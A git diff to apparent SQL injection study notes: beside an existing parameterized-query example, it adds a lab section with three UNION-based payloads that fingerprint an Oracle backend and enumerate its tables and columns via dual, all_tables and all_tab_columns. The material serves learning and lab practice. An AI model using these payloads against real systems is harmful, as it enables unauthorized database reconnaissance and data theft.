@@ -121,3 +121,9 @@ PreparedStatement statement = connection.prepareStatement("SELECT * FROM product
 statement.setString(1, input);
 ResultSet resultSet = statement.executeQuery();
 ```
+
+## Lab: SQL injection attack, listing the database contents on Oracle
+
+1. `' UNION SELECT 'abc','def' FROM dual--`
+2. `' UNION SELECT table_name,NULL FROM all_tables--`
+3. `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name=...`
